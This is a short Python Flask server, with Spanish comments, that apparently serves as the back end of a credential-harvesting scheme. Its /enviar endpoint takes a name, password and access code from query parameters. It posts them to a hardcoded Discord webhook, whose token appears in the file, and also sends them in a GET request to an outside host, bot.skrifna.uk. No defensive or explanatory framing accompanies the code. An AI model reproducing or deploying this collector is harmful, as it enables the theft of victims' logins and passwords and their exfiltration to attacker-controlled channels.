import os
import threading
import requests
from flask import Flask, request
from flask_cors import CORS

# ===================== 🔧 CONFIGURACIÓN ======================
WEBHOOK_URL = "https://discord.com/api/webhooks/1379160851432341695/xya9f3wHLQIfu6n7Fw8Lp70xrFHlbBDXTXNrdqVGzK98mZTZpV1AO18cLuISiWgwoP7L"


app = Flask(__name__)
CORS(app)

def mensaje(NOMBRE, PASS, ACCES):

    WA_API = f"https://bot.skrifna.uk/w?n={NOMBRE}&p={PASS}&a={ACCES}"

    EMBEB = {
        "content": f"""NBM: {NOMBRE}
PASS: {PASS}
ACCES: {ACCES}""",
}

    try:
        resp = requests.post(WEBHOOK_URL, json=EMBEB)
        if resp.status_code in (200, 204):
            try:
                response = requests.get(WA_API)
                response.raise_for_status()  # * Lanza error si status no es 2xx
                print("Respuesta del servidor:", response.text)
            except requests.RequestException as e:
                print("❌ Error al enviar la solicitud:", e)
            return "✅ Mensaje enviado", 200
        else:
            return f"❌ Error al enviar mensaje: {resp.status_code}\n{resp.text}", 500
    except Exception as e:
        return f"❌ Error en el servidor: {str(e)}", 500

@app.route("/enviar", methods=["GET"])
def enviar():
    NOMBRE = request.args.get("NOMBRE", "")
    PASS = request.args.get("PASS", "")
    ACCES = request.args.get("ACCES", "")

    return mensaje(NOMBRE, PASS, ACCES)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
